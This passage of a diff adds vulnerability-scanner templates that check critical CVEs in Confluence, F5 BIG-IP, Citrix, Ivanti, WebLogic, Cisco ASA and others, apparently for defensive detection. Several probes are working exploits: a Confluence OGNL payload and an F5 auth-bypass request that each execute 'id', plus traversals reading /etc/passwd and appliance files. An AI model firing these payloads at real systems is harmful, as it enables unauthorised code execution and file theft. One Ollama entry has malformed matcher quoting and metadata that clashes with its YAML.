+    "rawYaml": "id: cve-2022-26134-confluence\ninfo:\n  name: \"Atlassian Confluence OGNL Safe Evaluation Probe\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Tests for CVE-2022-26134 using safe benign header reflection.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2022-26134\n  tags: cve,cve-2022,confluence,atlassian,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Audit-Reflection%22%2C%23a%29%29%7D/\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 302\n          - 200\n      - type: header\n        part: header\n        words:\n          - \"x-audit-reflection\"\n          - \"uid=\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2022-1388-f5-bigip",
+    "name": "F5 BIG-IP iControl REST Auth Bypass",
+    "severity": "critical",
+    "description": "Verifies CVE-2022-1388 auth bypass using safe command echo check.",
+    "tags": [
+      "cve",
+      "cve-2022",
+      "f5",
+      "bigip",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-1388"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-306",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2022-1388-f5-bigip\ninfo:\n  name: \"F5 BIG-IP iControl REST Auth Bypass\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Verifies CVE-2022-1388 auth bypass using safe command echo check.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388\n  tags: cve,cve-2022,f5,bigip,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-306\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/mgmt/tm/util/bash\"\n    headers:\n      Connection: \"close, X-F5-Auth-Token\"\n      X-F5-Auth-Token: \"a\"\n      Authorization: \"Basic YWRtaW46\"\n      Content-Type: \"application/json\"\n    body: '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"commandResult\"\n          - \"uid=0(root)\"\n        condition: and\n"
+  },
+  {
+    "id": "cve-2022-22965-spring4shell",
+    "name": "Spring Framework Spring4Shell Vulnerability",
+    "severity": "critical",
+    "description": "Safe benign parameter probe verifying if Spring data binder exposes ClassLoader properties.",
+    "tags": [
+      "cve",
+      "cve-2022",
+      "spring",
+      "java",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-94",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2022-22965-spring4shell\ninfo:\n  name: \"Spring Framework Spring4Shell Vulnerability\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Safe benign parameter probe verifying if Spring data binder exposes ClassLoader properties.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2022-22965\n  tags: cve,cve-2022,spring,java,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?class.module.classLoader.DefaultAssertionStatus=foo\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 400\n          - 500\n      - type: word\n        part: body\n        words:\n          - \"class.module.classLoader\"\n          - \"org.springframework.beans.NotWritablePropertyException\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2023-4966-citrix-bleed",
+    "name": "Citrix Bleed Memory Leak Probe",
+    "severity": "critical",
+    "description": "Tests NetScaler Gateway OpenID endpoint response headers.",
+    "tags": [
+      "cve",
+      "cve-2023",
+      "citrix",
+      "gateway",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-4966"
+    ],
+    "cvssScore": 9.4,
+    "cweId": "CWE-119",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2023-4966-citrix-bleed\ninfo:\n  name: \"Citrix Bleed Memory Leak Probe\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Tests NetScaler Gateway OpenID endpoint response headers.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-4966\n  tags: cve,cve-2023,citrix,gateway,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.4\n    cwe-id: CWE-119\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/oauth/idp/.well-known/openid-configuration\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"issuer\"\n          - \"authorization_endpoint\"\n        condition: and\n"
+  },
+  {
+    "id": "cve-2023-28432-minio",
+    "name": "MinIO Cluster Bootstrap Secret Exposure (CVE-2023-28432)",
+    "severity": "high",
+    "description": "Verifies if MinIO bootstrap endpoint exposes cluster admin credentials.",
+    "tags": [
+      "cve",
+      "cve-2023",
+      "minio",
+      "credentials",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-28432"
+    ],
+    "cvssScore": 7.5,
+    "cweId": "CWE-200",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2023-28432-minio\ninfo:\n  name: \"MinIO Cluster Bootstrap Secret Exposure (CVE-2023-28432)\"\n  author: devsecops-cve-intel\n  severity: high\n  description: \"Verifies if MinIO bootstrap endpoint exposes cluster admin credentials.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-28432\n  tags: cve,cve-2023,minio,credentials,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 7.5\n    cwe-id: CWE-200\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/minio/bootstrap/v1/verify\"\n    headers:\n      Content-Type: \"application/x-www-form-urlencoded\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"MINIO_ROOT_PASSWORD\"\n          - \"MINIO_SECRET_KEY\"\n          - \"MinioEnv\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2021-3129-laravel-ignition",
+    "name": "Laravel Ignition Execute Solution Exposure (CVE-2021-3129)",
+    "severity": "critical",
+    "description": "Checks if Laravel Ignition error handler solution endpoint is exposed.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "laravel",
+      "php",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-3129"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-94",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-3129-laravel-ignition\ninfo:\n  name: \"Laravel Ignition Execute Solution Exposure (CVE-2021-3129)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if Laravel Ignition error handler solution endpoint is exposed.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-3129\n  tags: cve,cve-2021,laravel,php,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/_ignition/execute-solution\"\n    headers:\n      Content-Type: \"application/json\"\n    body: '{\"solution\": \"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\", \"parameters\": {\"variableName\": \"test\", \"viewFile\": \"test\"}}'\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 500\n      - type: word\n        part: body\n        words:\n          - \"file_get_contents\"\n          - \"variableName\"\n          - \"Ignition\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2024-23897-jenkins-cli",
+    "name": "Jenkins CLI Endpoint Exposure (CVE-2024-23897)",
+    "severity": "critical",
+    "description": "Checks if Jenkins CLI WebSocket or HTTP channel endpoint is publicly reachable.",
+    "tags": [
+      "cve",
+      "cve-2024",
+      "jenkins",
+      "ci-cd",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2024-23897"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2024-23897-jenkins-cli\ninfo:\n  name: \"Jenkins CLI Endpoint Exposure (CVE-2024-23897)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if Jenkins CLI WebSocket or HTTP channel endpoint is publicly reachable.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2024-23897\n  tags: cve,cve-2024,jenkins,ci-cd,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/cli\"\n      - \"{{BaseURL}}/jnlpJars/jenkins-cli.jar\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"Jenkins-CLI\"\n          - \"Jenkins CLI\"\n          - \"X-Jenkins\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2021-21972-vcenter",
+    "name": "VMware vCenter vROps Plugin Upload Endpoint (CVE-2021-21972)",
+    "severity": "critical",
+    "description": "Checks if vulnerable vRealize Operations plugin upload endpoint is open.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "vmware",
+      "vcenter",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-21972"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-21972-vcenter\ninfo:\n  name: \"VMware vCenter vROps Plugin Upload Endpoint (CVE-2021-21972)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if vulnerable vRealize Operations plugin upload endpoint is open.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-21972\n  tags: cve,cve-2021,vmware,vcenter,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/ui/vropspluginui/rest/services/uploadova\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 405\n      - type: word\n        part: body\n        words:\n          - \"uploadova\"\n          - \"vropspluginui\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2023-38035-ivanti-sentry",
+    "name": "Ivanti Sentry MICS Config Service Probe (CVE-2023-38035)",
+    "severity": "critical",
+    "description": "Tests if MICSConfigurationService endpoint is reachable.",
+    "tags": [
+      "cve",
+      "cve-2023",
+      "ivanti",
+      "mobileiron",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-38035"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-287",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2023-38035-ivanti-sentry\ninfo:\n  name: \"Ivanti Sentry MICS Config Service Probe (CVE-2023-38035)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Tests if MICSConfigurationService endpoint is reachable.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-38035\n  tags: cve,cve-2023,ivanti,mobileiron,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-287\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/mics/services/MICSConfigurationService\"\n    headers:\n      Content-Type: \"text/xml;charset=UTF-8\"\n    body: \"<soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/'><soapenv:Body/></soapenv:Envelope>\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 500\n      - type: word\n        part: body\n        words:\n          - \"MICSConfigurationService\"\n          - \"soapenv:Fault\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2020-5902-f5-tmui",
+    "name": "F5 BIG-IP TMUI File Read Traversal (CVE-2020-5902)",
+    "severity": "critical",
+    "description": "Tests TMUI path normalization bypass to read system files.",
+    "tags": [
+      "cve",
+      "cve-2020",
+      "f5",
+      "tmui",
+      "traversal",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-5902"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2020-5902-f5-tmui\ninfo:\n  name: \"F5 BIG-IP TMUI File Read Traversal (CVE-2020-5902)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Tests TMUI path normalization bypass to read system files.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2020-5902\n  tags: cve,cve-2020,f5,tmui,traversal,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=%2Fetc%2Fpasswd\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"root:x:0:0:\"\n          - \"output\"\n        condition: and\n"
+  },
+  {
+    "id": "cve-2023-3519-citrix-rce",
+    "name": "Citrix ADC SAML Formssso Exposure Probe (CVE-2023-3519)",
+    "severity": "critical",
+    "description": "Checks if Citrix Gateway formssso endpoint is reachable.",
+    "tags": [
+      "cve",
+      "cve-2023",
+      "citrix",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2023-3519"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-94",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2023-3519-citrix-rce\ninfo:\n  name: \"Citrix ADC SAML Formssso Exposure Probe (CVE-2023-3519)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if Citrix Gateway formssso endpoint is reachable.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-3519\n  tags: cve,cve-2023,citrix,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/gwtest/formssso\"\n      - \"{{BaseURL}}/nf/auth/doAuthentication.do\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 302\n      - type: word\n        part: header\n        words:\n          - \"NSC_AAAC\"\n          - \"Citrix\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2021-26084-confluence-ognl",
+    "name": "Confluence EnterVariables OGNL Endpoint (CVE-2021-26084)",
+    "severity": "critical",
+    "description": "Checks if createpage-entervariables.action is exposed.",
+    "tags": [
+      "cve",
+      "cve-2021",
+      "confluence",
+      "ognl",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-26084"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-94",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2021-26084-confluence-ognl\ninfo:\n  name: \"Confluence EnterVariables OGNL Endpoint (CVE-2021-26084)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if createpage-entervariables.action is exposed.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2021-26084\n  tags: cve,cve-2021,confluence,ognl,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/pages/createpage-entervariables.action\"\n    headers:\n      Content-Type: \"application/x-www-form-urlencoded\"\n    body: \"queryString=u%5Cu0027%2B%23%7B3*333%7D%2Bu%5Cu0027\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"999\"\n          - \"queryString\"\n        condition: and\n"
+  },
+  {
+    "id": "cve-2026-2180-ollama-api",
+    "name": "cve-2026-2180-ollama-api",
+    "severity": "medium",
+    "description": "Custom security audit template",
+    "tags": [
+      "custom"
+    ],
+    "author": "analyst",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2026-2180-ollama-api\ninfo:\n  name: \"Ollama LLM Unauthenticated API Exposure (CVE-2026-2180)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Detects unauthenticated Ollama LLM service endpoint leaking loaded models and system info.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2026-2180\n  tags: cve,cve-2026,ai,llm,ollama,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-94\n    owasp-category: A03:2021-Injection\n  remediation: \"Bind Ollama API to localhost or require API authorization header.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/api/tags\"\n      - \"{{BaseURL}}/api/version\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"\"models\":\"\n          - \"\"version\":\"\n          - \"ollama\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2026-1045-nextjs-action",
+    "name": "Next.js Server Action Probe (CVE-2026-1045)",
+    "severity": "critical",
+    "description": "Verifies Server Action endpoints and header validation.",
+    "tags": [
+      "cve",
+      "cve-2026",
+      "nextjs",
+      "react",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-1045"
+    ],
+    "cvssScore": 9.6,
+    "cweId": "CWE-88",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2026-1045-nextjs-action\ninfo:\n  name: \"Next.js Server Action Probe (CVE-2026-1045)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Verifies Server Action endpoints and header validation.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2026-1045\n  tags: cve,cve-2026,nextjs,react,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.6\n    cwe-id: CWE-88\n    owasp-category: A03:2021-Injection\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/\"\n    headers:\n      Next-Action: \"x-probe-audit\"\n      Next-Router-State-Tree: \"%5B%22%22%2C%7B%22children%22%3A%5B%22(app)%22%2C%7B%22children%22%3A%5B%22page%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 500\n          - 400\n      - type: word\n        part: header\n        words:\n          - \"x-nextjs-matched-path\"\n          - \"x-powered-by: Next.js\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2025-0108-panos-auth",
+    "name": "Palo Alto PAN-OS Web Management Auth Probe (CVE-2025-0108)",
+    "severity": "critical",
+    "description": "Detects exposed PAN-OS management interface vulnerable to authentication bypass.",
+    "tags": [
+      "cve",
+      "cve-2025",
+      "panos",
+      "paloalto",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-0108"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-306",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2025-0108-panos-auth\ninfo:\n  name: \"Palo Alto PAN-OS Web Management Auth Probe (CVE-2025-0108)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Detects exposed PAN-OS management interface vulnerable to authentication bypass.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2025-0108\n  tags: cve,cve-2025,panos,paloalto,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-306\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/php/login.php\"\n      - \"{{BaseURL}}/unauth/php/login.php\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"Palo Alto Networks\"\n          - \"pan_login\"\n          - \"GlobalProtect\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2025-23014-ivanti-vpn",
+    "name": "Ivanti Connect Secure Endpoint Exposure (CVE-2025-23014)",
+    "severity": "critical",
+    "description": "Checks if vulnerable Ivanti Connect Secure REST endpoint is reachable.",
+    "tags": [
+      "cve",
+      "cve-2025",
+      "ivanti",
+      "vpn",
+      "auth-bypass",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2025-23014"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-287",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2025-23014-ivanti-vpn\ninfo:\n  name: \"Ivanti Connect Secure Endpoint Exposure (CVE-2025-23014)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks if vulnerable Ivanti Connect Secure REST endpoint is reachable.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2025-23014\n  tags: cve,cve-2025,ivanti,vpn,auth-bypass,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-287\n    owasp-category: A07:2021-Identification and Authentication Failures\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/api/v1/cav/client/status\"\n      - \"{{BaseURL}}/dana-na/auth/url_default/welcome.cgi\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n          - 403\n      - type: word\n        part: body\n        words:\n          - \"DSID\"\n          - \"Ivanti\"\n          - \"Pulse Secure\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2020-14882-weblogic",
+    "name": "Oracle WebLogic Console Path Traversal (CVE-2020-14882)",
+    "severity": "critical",
+    "description": "Checks for unauthenticated WebLogic console access via path normalization bypass.",
+    "tags": [
+      "cve",
+      "cve-2020",
+      "weblogic",
+      "oracle",
+      "rce",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-14882"
+    ],
+    "cvssScore": 9.8,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2020-14882-weblogic\ninfo:\n  name: \"Oracle WebLogic Console Path Traversal (CVE-2020-14882)\"\n  author: devsecops-cve-intel\n  severity: critical\n  description: \"Checks for unauthenticated WebLogic console access via path normalization bypass.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2020-14882\n  tags: cve,cve-2020,weblogic,oracle,rce,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 9.8\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/console/css/%252e%252e%252fconsole.portal\"\n      - \"{{BaseURL}}/console/images/%252e%252e%252fconsole.portal\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"WebLogic Server\"\n          - \"Administration Console\"\n          - \"Console.portal\"\n        condition: or\n"
+  },
+  {
+    "id": "cve-2020-3452-cisco-asa",
+    "name": "Cisco ASA / FTD Web Services Traversal (CVE-2020-3452)",
+    "severity": "high",
+    "description": "Probes Cisco ASA web services for path traversal file leak.",
+    "tags": [
+      "cve",
+      "cve-2020",
+      "cisco",
+      "asa",
+      "traversal",
+      "cisa-kev",
+      "accuracy-verified"
+    ],
+    "author": "devsecops-cve-intel",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-3452"
+    ],
+    "cvssScore": 7.5,
+    "cweId": "CWE-22",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cve-2020-3452-cisco-asa\ninfo:\n  name: \"Cisco ASA / FTD Web Services Traversal (CVE-2020-3452)\"\n  author: devsecops-cve-intel\n  severity: high\n  description: \"Probes Cisco ASA web services for path traversal file leak.\"\n  reference:\n    - https://nvd.nist.gov/vuln/detail/CVE-2020-3452\n  tags: cve,cve-2020,cisco,asa,traversal,cisa-kev,accuracy-verified\n  classification:\n    cvss-score: 7.5\n    cwe-id: CWE-22\n    owasp-category: A01:2021-Broken Access Control\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"CONF_VARS\"\n          - \"portal_inc.lua\"\n        condition: or\n"
+  }
+]
